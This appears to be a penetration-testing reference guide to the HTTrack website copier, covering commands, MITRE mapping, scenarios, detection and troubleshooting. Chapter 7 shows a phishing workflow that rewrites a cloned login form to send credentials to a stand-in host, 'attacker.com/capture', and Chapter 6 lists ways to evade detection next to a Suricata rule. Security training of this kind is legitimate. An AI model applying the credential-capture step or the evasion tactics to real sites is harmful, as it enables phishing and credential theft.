---
tool_name: "httrack"
display_name: "HTTrack Website Copier"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "website_cloning"
install_command: "sudo apt install httrack"
version: "3.49.7"
github_repo: "https://github.com/xroche/httrack"
kali_tools_page: "https://www.kali.org/tools/httrack/"
difficulty_level: "beginner-to-intermediate"
requires_root: false
gui_available: true
tags: ["website-mirroring", "offline-browsing", "cloning", "reconnaissance", "phishing-support", "web-scraping"]
related_tools: ["wget", "curl", "photon", "gowitness"]
---

# HTTrack - Website Copier & Offline Browser

## Chapter 1: Introduction & Overview

### What is HTTrack?

HTTrack (WinHTTrack / WebHTTrack) is an offline browser utility that downloads an entire website from the Internet to a local directory, recursively building all directories and retrieving HTML, images, and other files from the server. It preserves the original site's relative link structure, allowing the mirrored website to be browsed locally as if viewing it online. HTTrack is widely used for website cloning in penetration testing engagements (phishing support) and for creating offline copies of websites for analysis.

### History & Background

- **Created:** Xavier Roche
- **Version:** 3.49.7 (Kali package) / 3.49.13 (latest release)
- **License:** GPL-3.0
- **Language:** C (72.5%), HTML (16%), Shell (7.5%), Python (2.4%)
- **Platforms:** Linux (WebHTTrack), Windows (WinHTTrack), macOS, BSD

HTTrack has been the industry-standard website mirroring tool since the late 1990s. Its reliability, configurability, and link-structure preservation make it the go-to tool for creating faithful website clones. In penetration testing, HTTrack is used to clone login pages for phishing assessments, create offline copies for vulnerability analysis, and build reference copies of target websites.

### When to Use This Tool

- **Phishing assessments:** Clone login pages for authorized phishing tests
- **Website analysis:** Create offline copies for vulnerability scanning
- **Documentation:** Archive website content for compliance
- **Research:** Study website structure and technology stack
- **Backup:** Create offline mirrors of critical websites
- **CTF challenges:** Clone target websites for analysis

### When NOT to Use This Tool

- To clone websites without the owner's permission (copyright issues)
- To create phishing sites without authorization
- Against websites that explicitly disallow mirroring (robots.txt)
- For mass downloading that could constitute a denial of service

### Legal and Ethical Considerations

- **Copyright:** Website content is copyrighted — cloning for phishing requires authorization
- **robots.txt:** Respect the site's crawling rules unless specifically authorized to ignore them
- **Rate limiting:** Don't overwhelm servers with excessive requests
- **Scope:** Only clone sites within your engagement scope
- **Data handling:** Mirrored sites may contain sensitive data — handle appropriately
- **Terms of Service:** Some sites prohibit automated downloading

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Website Mirroring** | Creating a local copy of a website that preserves link structure |
| **Recursive Download** | Following links to download all pages and assets |
| **Link Rewriting** | Modifying URLs to point to local copies |
| **Depth Control** | Limiting how many levels deep the crawler follows |
| **Filtering** | Including/excluding files by type, size, or URL pattern |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux, Windows, macOS
- **Root access:** Not required
- **Disk Space:** Varies — large sites can consume GBs
- **Dependencies:** libhttrack2

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install httrack
```

#### Method 2: Additional Packages

```bash
# Install all HTTrack packages
sudo apt install httrack httrack-doc libhttrack-dev libhttrack2 webhttrack

# WebHTTrack (web interface)
sudo apt install webhttrack webhttrack-common

# ProxyTrack (cache proxy)
sudo apt install proxytrack
```

#### Method 3: Build from Source

```bash
git clone https://github.com/xroche/httrack.git --recurse-submodules
cd httrack
./bootstrap
./configure --prefix=$HOME/usr && make -j8 && make install

# Or use the one-shot wrapper
./build.sh --prefix=$HOME/usr
```

### Verify Installation

```bash
httrack --version
# Output: HTTrack version 3.49-7
```

### Package Overview

| Package | Description |
|---------|-------------|
| `httrack` | Command-line website copier |
| `httrack-doc` | HTML documentation |
| `libhttrack-dev` | Development headers |
| `libhttrack2` | Core library |
| `webhttrack` | Web-based GUI |
| `proxytrack` | HTTP cache proxy |

---

## Chapter 3: Architecture & Operation

### Mirroring Process

```
1. User provides URL(s) and options
2. HTTrack parses starting URLs
3. Spider engine discovers links on each page
4. URL filter applies include/exclude rules
5. Download engine fetches files via HTTP/FTP
6. Files saved to local directory structure
7. Link converter rewrites URLs to local paths
8. HTML files updated with rewritten links
9. Process repeats for discovered links (up to depth limit)
10. Mirror complete — browse locally
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Active Scanning | T1595 | Web crawling and content discovery |
| Phishing | T1566 | Cloned pages for phishing support |
| Gather Victim Host Information | T1592 | Website technology fingerprinting |

### Output Structure

```
mirrored-site/
├── index.html                    # Starting page
├── index.html(original)          # Original page with metadata
├── hts-cache/                    # Cache for updates
│   ├── new.txt                   # New links queue
│   └── test.txt                  # Tested links
├── hts-log.txt                   # Mirroring log
├── images/                       # Image files
├── css/                          # Stylesheets
├── js/                           # JavaScript files
└── subdirectory/                 # Mirrored subdirectories
```

### Link Rewriting

HTTrack rewrites links to make the mirrored site browseable offline:

**Original HTML:**
```html
<a href="https://example.com/page2.html">Link</a>
<img src="https://example.com/images/logo.png">
```

**Mirrored HTML:**
```html
<a href="../page2.html">Link</a>
<img src="../images/logo.png">
```

---

## Chapter 4: Command Reference

### Basic Operation

#### Mirror a Website

```bash
httrack http://www.example.com
```

**Explanation:** Download the entire www.example.com website to the current directory. Recursively follows all links.

#### Mirror to Specific Directory

```bash
httrack http://www.example.com -O /tmp/mirror
```

**Explanation:** Save the mirrored site to /tmp/mirror instead of the current directory.

#### Mirror with Custom User-Agent

```bash
httrack http://www.example.com -F "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

**Explanation:** Set a custom User-Agent string to mimic a legitimate browser.

### Essential Commands

#### Continue Interrupted Mirror

```bash
httrack -i
```

**Explanation:** Resume a previously interrupted mirroring session using the cache.

#### Update Existing Mirror

```bash
httrack --update
```

**Explanation:** Update an existing mirror by downloading only changed content.

#### Get Specific Files Only

```bash
httrack http://www.example.com/login.html -g
```

**Explanation:** Download only the specified file, not following links.

#### Mirror All Links from First Page

```bash
httrack http://www.example.com -Y
```

**Explanation:** Mirror all links found in the first-level pages.

### Spider/Testing Mode

#### Test Links Without Downloading

```bash
httrack http://www.example.com --spider
```

**Explanation:** Crawl the site to test links without downloading files. Reports errors and warnings.

#### Test Specific URL

```bash
httrack http://www.example.com/broken-link.html --test
```

**Explanation:** Test a specific URL to check if it's accessible.

### Depth and Scope Control

#### Set Mirror Depth

```bash
httrack http://www.example.com -r6
```

**Explanation:** Follow links up to 6 levels deep from the starting page.

#### Set External Link Depth

```bash
httrack http://www.example.com %e2
```

**Explanation:** Follow external links up to 2 levels deep.

#### Stay on Same Domain

```bash
httrack http://www.example.com -d
```

**Explanation:** Only mirror pages from the same principal domain.

#### Stay on Same Address

```bash
httrack http://www.example.com -a
```

**Explanation:** Only mirror pages from the same address (host + port).

#### Go Everywhere

```bash
httrack http://www.example.com -e
```

**Explanation:** Follow links to any domain on the web.

### Filtering

#### Include Only Specific File Types

```bash
httrack http://www.example.com +*.html +*.css +*.js
```

**Explanation:** Only download HTML, CSS, and JavaScript files.

#### Exclude Specific File Types

```bash
httrack http://www.example.com -mime:application/* -mime:video/*
```

**Explanation:** Exclude binary files, videos, and applications.

#### Include by URL Pattern

```bash
httrack http://www.example.com +*.example.com/admin/*
```

**Explanation:** Include all URLs matching the admin path pattern.

#### Exclude by URL Pattern

```bash
httrack http://www.example.com -logout -admin -delete
```

**Explanation:** Exclude URLs containing "logout", "admin", or "delete".

### Flow Control

#### Set Connection Limit

```bash
httrack http://www.example.com c16
```

**Explanation:** Use 16 simultaneous connections for faster downloading.

#### Set Timeout

```bash
httrack http://www.example.com T30
```

**Explanation:** Set a 30-second timeout for each connection.

#### Set Maximum File Size

```bash
httrack http://www.example.com m5000000
```

**Explanation:** Limit individual file size to 5 MB.

#### Set Maximum Mirror Size

```bash
httrack http://www.example.com M100000000
```

**Explanation:** Limit total mirror size to 100 MB.

### Browser ID Spoofing

#### Set User-Agent

```bash
httrack http://www.example.com -F "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

**Explanation:** Mimic a Chrome browser User-Agent.

#### Set Referer

```bash
httrack http://www.example.com %R "http://www.google.com"
```

**Explanation:** Set the HTTP Referer header to Google.

#### Set Additional Headers

```bash
httrack http://www.example.com %X "X-Forwarded-For: 1.2.3.4"
```

**Explanation:** Add custom HTTP headers to requests.

### Proxy Usage

#### Use HTTP Proxy

```bash
httrack http://www.example.com -P proxy.example.com:8080
```

**Explanation:** Route all requests through an HTTP proxy.

#### Use Authenticated Proxy

```bash
httrack http://www.example.com -P user:pass@proxy.example.com:8080
```

**Explanation:** Use a proxy with authentication credentials.

### Output Options

#### Set Structure Type

```bash
httrack http://www.example.com N1
```

**Explanation:** Use structure type 1 (HTML in web/, images in web/images/).

#### Long File Names

```bash
httrack http://www.example.com L1
```

**Explanation:** Use long file names instead of 8.3 format.

#### Generate MIME Archive

```bash
httrack http://www.example.com %M
```

**Explanation:** Generate an RFC MIME-encapsulated full-archive (.mht) file.

### Complete Shortcuts Reference

| Shortcut | Description |
|----------|-------------|
| `--mirror` | Mirror websites (default) |
| `--get` | Get files without seeking other URLs |
| `--mirrorlinks` | Mirror all links in first-level pages |
| `--testlinks` | Test links in pages |
| `--spider` | Spider site(s) to test links |
| `--testsite` | Same as --spider |
| `--skeleton` | Mirror only HTML files |
| `--update` | Update mirror without confirmation |
| `--continue` | Continue mirror without confirmation |
| `--catchurl` | Create temporary proxy to capture URL |
| `--clean` | Erase cache and log files |

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Clone Login Page for Phishing Assessment

**Setup:**

```bash
# Clone a corporate login page
httrack "https://login.target-corp.com/*" \
  -O /tmp/phishing_clone \
  -F "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  +*.target-corp.com/login* \
  +*.target-corp.com/auth* \
  +*.target-corp.com/static/* \
  -mime:application/* \
  -r4 \
  -c16
```

**Explanation:** Clone the login page with all static assets (CSS, JS, images) up to 4 levels deep, excluding binary files.

**After Cloning:**
```bash
# Serve the cloned site for the phishing test
cd /tmp/phishing_clone
python3 -m http.server 8080

# The cloned site is at http://localhost:8080
# Use with evilginx2 or SET for the actual phishing test
```

### Scenario 2: Offline Vulnerability Analysis

```bash
# Clone a web application for local analysis
httrack http://internal-app.company.local \
  -O /tmp/app_mirror \
  -r6 \
  +*.php +*.html +*.js +*.css \
  -mime:image/* \
  -v

# Analyze the source code offline
find /tmp/app_mirror -name "*.php" -exec grep -l "mysql_query\|eval\|exec" {} \;

# Check for hardcoded credentials
grep -rn "password\|api_key\|secret" /tmp/app_mirror/ --include="*.js" --include="*.php" --include="*.html"

# Test for JavaScript vulnerabilities
find /tmp/app_mirror -name "*.js" -exec grep -l "document.cookie\|localStorage\|eval" {} \;
```

### Scenario 3: Technology Stack Fingerprinting

```bash
# Mirror with verbose output to see all technologies
httrack http://www.target-site.com \
  -O /tmp/tech_recon \
  -v \
  --spider

# Analyze the mirrored structure
ls -la /tmp/tech_recon/

# Check for technology indicators
grep -rn "wp-content\|joomla\|drupal" /tmp/tech_recon/ --include="*.html" | head -20
grep -rn "react\|angular\|vue\|jquery" /tmp/tech_recon/ --include="*.js" | head -20
grep -rn "\.php\|\.asp\|\.jsp\|\.cgi" /tmp/tech_recon/ --include="*.html" | head -20
```

### Scenario 4: Comprehensive Site Archive

```bash
# Full mirror with all options
httrack "https://docs.company.com/*" \
  -O /tmp/docs_archive \
  -r8 \
  -F "Mozilla/5.0 (compatible; CompanyBot/1.0)" \
  -L1 \
  -c32 \
  -T60 \
  +*.html +*.pdf +*.doc +*.docx +*.css +*.js +*.png +*.jpg \
  -v \
  --search-index
```

**Explanation:** Create a comprehensive, searchable archive of documentation with deep linking.

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**Web Server Logs:**
- Rapid sequential requests from single IP
- User-Agent containing "httrack" or "WinHTTrack"
- Unusual access patterns (all pages within seconds)
- Requests for robots.txt followed by ignored disallowed paths

**IDS/IPS Rules:**

```
# Suricata rule for HTTrack detection
alert http any any -> any any (msg:"HTTrack Website Copier"; \
  http.user_agent; content:"httrack"; nocase; sid:1000001; rev:1;)
```

**WAF Detection:**
- Rate limiting based on request frequency
- Behavioral analysis (sequential page access)
- User-Agent blacklisting

### Evasion Techniques

1. **Custom User-Agent:** Always use `-F` to set a legitimate-looking User-Agent
2. **Rate Limiting:** Use `%c5` to limit connections per second
3. **Delays:** Use `--delay` to add random delays between requests
4. **Randomize Order:** Access pages in non-sequential order
5. **Use Proxy:** Route through proxies to hide origin IP
6. **Session Tokens:** Use captured cookies for authenticated content

### Blue Team Countermeasures

- **Rate Limiting:** Limit requests per IP per second
- **User-Agent Filtering:** Block known mirroring tools
- **Honeypot Pages:** Create trap pages that detect crawlers
- **robots.txt Enforcement:** Block paths specified in robots.txt
- **CAPTCHA:** Require human verification after suspicious activity
- **Web Application Firewall:** Deploy WAF with bot detection
- **Behavioral Analysis:** Detect non-human browsing patterns

---

## Chapter 7: Integration with Other Tools

### Phishing Toolkit Integration

```bash
# Step 1: Clone target with HTTrack
httrack https://login.target.com/* -O /tmp/phish_site +*.target.com/login*

# Step 2: Modify cloned site for phishing
sed -i 's|action="https://login.target.com/auth"|action="https://attacker.com/capture"|' /tmp/phish_site/login.html

# Step 3: Serve with Evilginx2 or custom server
cd /tmp/phish_site && python3 -m http.server 8443
```

### Vulnerability Scanner Integration

```bash
# Step 1: Clone the target
httrack http://vulnerable-app.local -O /tmp/scan_target -r6

# Step 2: Analyze with static analysis tools
grep -rn "eval\|exec\|system\|passthru" /tmp/scan_target --include="*.php"
grep -rn "document.cookie\|innerHTML\|eval" /tmp/scan_target --include="*.js"

# Step 3: Use with Nikto for local analysis
nikto -root /tmp/scan_target -Format txt -output scan_results.txt
```

### GoWitness Screenshot Integration

```bash
# Step 1: Mirror the site
httrack http://www.target.com -O /tmp/target_mirror

# Step 2: Take screenshots of all pages
gowitness file -f /tmp/target_mirror -P /tmp/screenshots
```

### wget Comparison

```bash
# HTTrack (preserves link structure):
httrack http://www.example.com -O /tmp/httrack_mirror

# wget (simpler, but rewrites links differently):
wget --mirror --convert-links --page-requisites http://www.example.com -P /tmp/wget_mirror

# HTTrack advantages:
# - Better link rewriting
# - Interactive GUI (WebHTTrack)
# - Resume capability
# - Filtering options
# - Cache for updates

# wget advantages:
# - Simpler syntax
# - Always available (no extra install)
# - Better for single-file downloads
```

### Python Integration

```bash
# Use HTTrack from Python for automation
python3 -c "
import subprocess
result = subprocess.run([
    'httrack',
    'http://www.example.com',
    '-O', '/tmp/mirror',
    '-r4',
    '--spider'
], capture_output=True, text=True)
print(result.stdout)
print(result.stderr)
"
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: HTTrack not following links**

```bash
# Check depth setting (default is 9999)
httrack http://www.example.com -r10

# Check filtering rules
httrack http://www.example.com +*.html +*.css +*.js

# Use verbose mode to see what's happening
httrack http://www.example.com -v
```

**Issue: Login-protected content not downloading**

```bash
# Use cookies from an authenticated session
httrack http://www.example.com -b "session_id=ABC123"

# Or use a proxy that handles authentication
httrack http://www.example.com -P auth_user:auth_pass@proxy:8080

# For form-based auth, capture POST data and use --post-data
```

**Issue: Too many files downloaded**

```bash
# Limit file size
httrack http://www.example.com m1000000

# Limit total mirror size
httrack http://www.example.com M50000000

# Filter by type
httrack http://www.example.com +*.html +*.css -mime:video/* -mime:application/*
```

**Issue: Mirror is broken/unusable**

```bash
# Check if link rewriting is working
grep -r "http://" /tmp/mirror/ | head -20

# Use different structure type
httrack http://www.example.com N0

# Keep original links
httrack http://www.example.com K4

# Don't rewrite external links
httrack http://www.example.com -replace-external
```

**Issue: Connection refused or timeout**

```bash
# Increase timeout
httrack http://www.example.com T120

# Reduce connection count
httrack http://www.example.com c4

# Use proxy
httrack http://www.example.com -P proxy:8080

# Check if site blocks automated requests
curl -I http://www.example.com
```

### Debug Mode

```bash
# Extra verbose logging
httrack http://www.example.com -vz 2>&1 | tee httrack_debug.log

# Debug HTTP headers
httrack http://www.example.com %H

# Debug parser
httrack http://www.example.com -#d

# Check cache state
ls -la hts-cache/
cat hts-cache/new.txt
```

### Log Analysis

```bash
# View mirroring log
cat hts-log.txt

# Search for errors
grep -i "error\|fail\|404\|403" hts-log.txt

# Count downloaded files
wc -l hts-log.txt

# Check mirror statistics
tail -20 hts-log.txt
```

### Cache Management

```bash
# Clear cache and start fresh
httrack --clean

# Manually manage cache
rm -rf hts-cache/

# Force re-download (ignore cache)
httrack http://www.example.com C0
```

---

## Resources

- **GitHub:** https://github.com/xroche/httrack
- **Website:** http://www.httrack.com
- **Documentation:** http://www.httrack.com/html/
- **Kali Documentation:** https://www.kali.org/tools/httrack/
- **FAQ:** http://www.httrack.com/html/faq.html
- **Related Tool - wget:** https://www.gnu.org/software/wget/
- **Related Tool - curl:** https://curl.se
- **WebHTTrack Screenshots:** http://www.httrack.com/page/21/
